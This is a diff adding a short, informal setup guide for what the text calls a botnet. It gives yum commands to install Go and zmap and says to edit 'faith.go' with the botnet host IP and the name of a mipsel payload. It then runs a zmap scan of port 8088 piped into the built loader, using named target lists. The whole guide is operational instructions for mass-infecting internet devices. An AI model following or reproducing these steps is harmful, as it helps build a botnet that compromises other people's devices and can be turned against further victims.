@@ -1,0 +1,27 @@
+use these commands:
+
+yum update
+yum upgrade
+
+yum install -y epel-release
+yum install go -if << that dont work try this- yum install golang
+yum install zmap
+
+go into the faith.go file and edit the ip and the mips name to ur mips name which can be found on ur net host vps by going into the /var/www/html directory and copy the name of the mipsel name and go into the faith.go file on line 57 change the ip to your botnet host ip and the mipsel name to the mipsel name u copied and save the file. drag all the files into the scanning vps and continue below
+
+go build faith.go
+
+ulimit -n 999999
+
+ulimit -n 999999; ulimit -e 999999; ulimit -u 999999; zmap -p 8088 -w faith2.lst | ./faith 8088
+
+
+^^^btw where it says faith2.lst - u change it to what ever the list name u want, best list is faith2.lst faith4.lst tr.zone es.zone
+
+
+after its loaded the program will freeze so you just ctrl+c out of that and continue with the next list
+
+
+
+hope u enjoy :)
+
